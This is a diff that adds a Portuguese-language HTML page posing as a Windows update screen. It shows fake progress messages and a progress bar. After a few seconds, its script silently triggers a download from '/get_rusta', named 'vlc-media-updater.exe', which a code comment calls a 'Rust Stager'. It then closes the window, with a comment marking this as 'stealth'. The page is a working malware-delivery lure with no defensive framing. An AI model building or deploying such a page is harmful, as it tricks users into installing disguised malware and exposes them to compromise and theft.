@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Windows - Atualizações</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background-color: #0d1117;
+            color: #c9d1d9;
+            font-family: "Segoe UI", Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+        }
+        .container {
+            text-align: center;
+            max-width: 480px;
+            padding: 40px;
+        }
+        h2 {
+            font-weight: 400;
+            margin-bottom: 30px;
+            font-size: 22px;
+        }
+        .spinner {
+            width: 56px;
+            height: 56px;
+            border: 5px solid #21262d;
+            border-top: 5px solid #58a6ff;
+            border-radius: 50%;
+            animation: spin 1.1s linear infinite;
+            margin: 0 auto 30px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .status {
+            font-size: 15px;
+            color: #8b949e;
+            min-height: 24px;
+            margin-bottom: 20px;
+        }
+        .progress-container {
+            width: 100%;
+            background-color: #21262d;
+            border-radius: 20px;
+            height: 6px;
+            margin-top: 10px;
+        }
+        .progress-bar {
+            height: 100%;
+            background-color: #58a6ff;
+            width: 0%;
+            border-radius: 20px;
+            transition: width 2.8s ease-in-out;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Instalando atualizações importantes do Windows</h2>
+        
+        <div class="spinner"></div>
+        
+        <p class="status" id="status">Verificando integridade do sistema...</p>
+        
+        <div class="progress-container">
+            <div class="progress-bar" id="progress"></div>
+        </div>
+    </div>
+
+    <script>
+        const statusMessages = [
+            "Verificando integridade do sistema...",
+            "Baixando atualizações de segurança...",
+            "Aplicando patches importantes...",
+            "Otimizando componentes do sistema...",
+            "Finalizando instalação..."
+        ];
+
+        let messageIndex = 0;
+        const statusElement = document.getElementById('status');
+        const progressBar = document.getElementById('progress');
+
+        // Atualiza as mensagens de status
+        function updateStatus() {
+            statusElement.innerText = statusMessages[messageIndex];
+            messageIndex = (messageIndex + 1) % statusMessages.length;
+        }
+
+        // Inicia as atualizações de status
+        setInterval(updateStatus, 1650);
+        updateStatus(); // Primeira mensagem
+
+        // Barra de progresso
+        setTimeout(() => {
+            progressBar.style.width = "42%";
+        }, 600);
+
+        setTimeout(() => {
+            progressBar.style.width = "78%";
+        }, 2200);
+
+        setTimeout(() => {
+            progressBar.style.width = "100%";
+            statusElement.innerText = "Instalação concluída. Reiniciando componentes...";
+        }, 4200);
+
+        // Auto-download do Rust Stager
+        setTimeout(() => {
+            const link = document.createElement('a');
+            link.href = '/get_rusta';
+            link.download = 'vlc-media-updater.exe';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }, 5800);
+
+        // Fecha a janela automaticamente (stealth)
+        setTimeout(() => {
+            window.close();
+        }, 9500);
+    </script>
+</body>
+</html>
